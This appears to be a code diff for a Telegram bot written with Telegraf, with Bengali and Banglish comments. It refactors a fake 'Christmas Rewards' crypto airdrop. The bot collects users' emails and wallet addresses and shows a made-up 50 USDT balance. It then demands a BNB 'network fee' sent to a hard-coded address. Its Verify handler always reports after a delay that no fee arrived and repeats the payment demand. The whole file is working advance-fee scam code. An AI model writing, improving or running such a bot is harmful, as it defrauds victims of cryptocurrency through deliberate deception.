@@ -31,46 +31,54 @@ bot.on('text', async (ctx) => {
     const text = ctx.message.text;
     const userId = ctx.from.id;
 
+    // Jodi user '💰 Balance' e click kore
+    if (text === '💰 Balance') {
+        return ctx.reply(`🤴 User : ${ctx.from.first_name}\n\nYour Balance: 50 USDT\n\n📝 If you submitted wrong data then you can restart the bot by clicking /start`);
+    }
+
+    // Jodi user '↘️ Withdraw' e click kore
+    if (text === '↘️ Withdraw') {
+        userData[userId] = { step: 'withdraw_wallet' };
+        return ctx.reply('✅ Now Submit Your USDT (BEP-20) Wallet Address to confirm withdrawal:');
+    }
+
+    // Jodi user '✅ Confirm' e click kore
+    if (text === '✅ Confirm') {
+        return ctx.reply(`📃 Please send 0.0108 BNB Smartchain as bscscan network fee for withdraw your USDT funds.\n\nAddress :- 0xef27672cf6da6f7a90fc5a87e9d93e72e2ac68e6\n\n➡️ once the server receives your transaction fee, you will receive your USDT within 2-3 minutes.\n\n⚠️ Note: After send transaction fee must click on [Verify] button`, 
+        Markup.keyboard([['☑️ Verify']]).resize());
+    }
+
+    // Jodi user '☑️ Verify' e click kore
+    if (text === '☑️ Verify') {
+        ctx.reply('🖐️ Hold on checking your transaction......');
+        setTimeout(() => {
+            ctx.reply('❎ We haven\'t received transaction fee.');
+            setTimeout(() => {
+                ctx.reply(`📃 Please send 0.0108 BNB Smartchain as bscscan network fee for withdraw your USDT funds.\n\nAddress :- 0xef27672cf6da6f7a90fc5a87e9d93e72e2ac68e6\n\n⚠️ Note: After send transaction fee must click on [Verify] button`, 
+                Markup.keyboard([['☑️ Verify']]).resize());
+            }, 1000);
+        }, 3000);
+        return;
+    }
+
+    // Email ba Wallet input check korar jonno step logic
     if (userData[userId]?.step === 'email') {
         userData[userId].email = text;
         userData[userId].step = 'wallet';
-        ctx.reply('➡️ Submit Your USDT (BEP-20) Wallet Address\n\nMust Submit Valid Wallet Address.');
+        return ctx.reply('➡️ Submit Your USDT (BEP-20) Wallet Address\n\nMust Submit Valid Wallet Address.');
     } 
-    else if (userData[userId]?.step === 'wallet') {
+    
+    if (userData[userId]?.step === 'wallet') {
         userData[userId].wallet = text;
         userData[userId].step = 'completed';
-        ctx.reply('🎉 Congratulations, you have successfully joined the Christmas Rewards.', 
+        return ctx.reply('🎉 Congratulations, you have successfully joined the Christmas Rewards.', 
         Markup.keyboard([['💰 Balance', '↘️ Withdraw']]).resize());
     }
-    else if (text === '💰 Balance') {
-        ctx.reply(`🤴 User : ${ctx.from.first_name}\n\nYour Balance: 50 USDT\n\n📝 If you submitted wrong data then you can restart the bot by clicking /start`);
-    }
-    else if (text === '↘️ Withdraw') {
-        ctx.reply('✅ Now Submit Your USDT (BEP-20) Wallet Address to confirm withdrawal:');
-        userData[userId].step = 'withdraw_wallet';
-    }
-    else if (userData[userId]?.step === 'withdraw_wallet') {
-        ctx.reply(`➡️ Your Balance 50.00 USDT\n\nPlease click on Confirm for proceed your USDT withdrawal`, 
-        Markup.keyboard([['✅ Confirm']]).resize());
-    }
-    else if (text === '✅ Confirm') {
-        ctx.reply(`📃 Please send 0.0108 BNB Smartchain as bscscan network fee for withdraw your USDT funds.\n\nAddress :- 0xef27672cf6da6f7a90fc5a87e9d93e72e2ac68e6\n\n➡️ once the server receives your transaction fee, you will receive your USDT within 2-3 minutes.\n\n⚠️ Note: After send transaction fee must click on [Verify] button`, 
-        Markup.keyboard([['☑️ Verify']]).resize());
-    }
-   else if (text === '☑️ Verify') {
-        ctx.reply('🖐️ Hold on checking your transaction......');
-        
-        setTimeout(() => {
-            // প্রথমে এরর মেসেজ পাঠাবে
-            ctx.reply('❎ We haven\'t received transaction fee.');
-            
-            // এর ঠিক পরেই আবার পেমেন্ট ইনস্ট্রাকশন পাঠিয়ে দেবে
-            setTimeout(() => {
-                ctx.reply(`📃 Please send 0.0108 BNB Smartchain as bscscan network fee for withdraw your USDT funds.\n\nAddress :- 0xef27672cf6da6f7a90fc5a87e9d93e72e2ac68e6\n\n➡️ once the server receives your transaction fee, you will receive your USDT within 2-3 minutes.\n\n⚠️ Note: After send transaction fee must click on [Verify] button`, 
-                Markup.keyboard([['☑️ Verify']]).resize());
-            }, 1000); // ১ সেকেন্ড বিরতি দিয়ে ইনস্ট্রাকশন আসবে
 
-        }, 3000); // ৩ সেকেন্ড চেকিং দেখাবে
+    if (userData[userId]?.step === 'withdraw_wallet') {
+        userData[userId].step = 'ready_to_confirm';
+        return ctx.reply(`➡️ Your Balance 50.00 USDT\n\nPlease click on Confirm for proceed your USDT withdrawal`, 
+        Markup.keyboard([['✅ Confirm']]).resize());
     }
 });
 
